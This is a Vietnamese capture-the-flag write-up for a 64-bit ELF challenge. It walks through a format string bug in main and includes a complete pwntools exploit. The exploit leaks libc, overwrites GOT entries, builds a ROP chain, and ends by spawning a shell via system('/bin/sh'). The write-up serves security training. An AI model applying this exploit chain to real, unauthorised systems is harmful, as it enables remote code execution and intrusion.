# **Ropchain**

File: ropchain - ELF linux 64 bit

## Phân tích

### kiểm tra các protection

![image](https://user-images.githubusercontent.com/31529599/147481006-bec9065b-d7ed-4058-b4d4-93649c612d48.png)

`No Canary found` -> Buffer Overflow

`No PIE` -> địa chỉ tĩnh

### Phân tích bằng IDA

Code hàm `main`:

Hàm này nhận vào Input bằng `scanf` sau đó in ra hàm hình với hàm `printf` mà không có format string -> lỗi format string

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char format[504]; // [rsp+0h] [rbp-200h] BYREF
  unsigned __int64 v4; // [rsp+1F8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  if ( !a )
  {
    __isoc99_scanf("%499s", format);
    printf(format);
    ++a;
  }
  exit(0);
}
```

## Khai thác

Hướng khai thác bài chung của bài này mình sẽ dùng format string để leak địa chỉ libc và ghi đè `got` của `exit` thành địa chỉ trả về của một rop chain sau đó lần lượt control stack và gọi hàm `scanf` để ghi chuối `/bin/sh` vào vùng nhớ cuối cùng gọi hàm `system` từ địa chỉ libc được leak trước đó

Chi tiết payload
- format string payload để leak `libc_start_main_ret` trên stack
- format string ghi đè `got` của `exit` thành rop chain `pop 6 thanh ghi` 
- format string ghi đè `got` của `printf` thành chuỗi format string `%s` sử dụng cho lần gọi `scanf` tiếp theo
- gadget pop rdi để pop `got.printf` vào rdi (được ghi đè thành %s) là tham số format string cho scanf
- gadget pop rsi; pop r15; ret để pop địa mà scanf đọc vào ở đây chúng ta đang muốn lưu `/bin/sh` tuy nhiên ở bài này mình tập dụng `got` ở đây `got.scanf` và `got.exit` nằm kề nhau nên mình sẽ scanf vào địa chỉ của `system` vào `got.scanf` và chuỗi `/bin/sh` ngay tiếp đó sẽ nằm ở vị trí `got.exit`
- địa chỉ `plt.scanf` để gọi scanf nhập vào `system + /bin/sh`
- gadget pop rdi; ret để pop `got.exit` được ghi đè thành `/bin/sh` là tham số cho `system`
- địa chỉ `got.scanf` được ghi đè thành system -> gọi `system("/bin/sh")`

## code khai thác

```python
from pwn import *

e = ELF('./ropchain')
# libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so') # remote libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


p = process('./ropchain')

# p = remote('45.122.249.68',10016)

offset = 6
payload = b''
payload = b'%12$n%71$llx' # leak libc lib_start_main_ret
print(payload)

payload += b'%4766c%21$hn%24699c%12$llnaa' # overwrite 2 first bytes of exit to ropchain pop_6 (offset 21), overwrite printf to format string %s
payload += p64(0x00000000004012b3)  # pop rdi ret
payload += p64(e.got['printf'])  # offset format string overwrite scanf and contain overwrite value format string for scanf '%s'
payload += p64(0x00000000004012b1) # pop rsi ; pop r15 ; ret
payload += p64(e.got['__isoc99_scanf']) # address to scanf to save system address
payload += b'A'*8 # padding for pop r15
payload += p64(e.plt['__isoc99_scanf']) # call scanf('%s',got.scanf)
payload += p64(0x00000000004012b3)  #pop rdi ret 
payload += p64(e.got['exit']) # got.exit = got.scanf + 4 so got.exit is saving '/bin/sh' after scanf
payload += p64(0x000000000040101a) # ret algin stack
payload += p64(e.plt['__isoc99_scanf']) # call scanf now overwrited by system and rdi = '/bin/sh'

# offset format string overwrite exit
payload += p64(e.got['exit'])


print(payload)
# raw_input('DEBUG')

p.sendline(payload)

addr = int(p.recv().strip()[:30].decode(), 16) # recv leak libc address

libc.address = addr - 234 - libc.symbols['__libc_start_main']
print(hex(addr-234-9))

p.sendline(p64(libc.symbols['system'])+b'/bin/sh\x00')

p.interactive()

```

Ở đây ta có leak địa chỉ của lib c tuy nhiên địa chỉ ở local và remote sẽ khác nhau cho nên ta có thể search trên libc database để biết được chính xác libc:

- libc local: `/lib/x86_64-linux-gnu/libc.so.6`
- libc remote: `libc6_2.31-0ubuntu9.1_amd64.so`

## Chạy script khai thác

![image](https://user-images.githubusercontent.com/31529599/147484639-4e3869c6-e2d0-4b6e-a33a-b99b687d8cee.png)


